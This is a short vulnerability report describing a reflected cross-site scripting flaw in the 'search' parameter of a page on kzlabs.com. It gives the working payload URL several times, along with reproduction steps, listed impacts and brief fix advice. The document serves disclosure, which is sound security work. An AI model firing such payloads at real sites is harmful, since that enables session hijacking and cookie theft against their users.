# Reflected Cross-Site Scripting (XSS) via `search` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `search` parameter of the application. User-controlled input is reflected back into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="m2t7ye"
http://kzlabs.com/16.php?search=%22xicorr%3E%3CsCript%3Ealert(1)%3C/script%3E
```

---

## Vulnerable Parameter

```text id="k5v9qp"
search
```

---

## Payload Used

```html id="d4u1ra"
"xicorr><sCript>alert(1)</script>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/16.php?search=%22xicorr%3E%3CsCript%3Ealert(1)%3C/script%3E
   ```

2. Observe that the payload is reflected in the HTML response.

3. The injected JavaScript executes automatically.

4. A popup dialog appears confirming successful XSS execution.

---

## Proof of Concept

```text id="q7s3ld"
http://kzlabs.com/16.php?search=%22xicorr%3E%3CsCript%3Ealert(1)%3C/script%3E
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/9ef8f326-7c74-4d74-b950-ae6a7d80fe55" />

---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
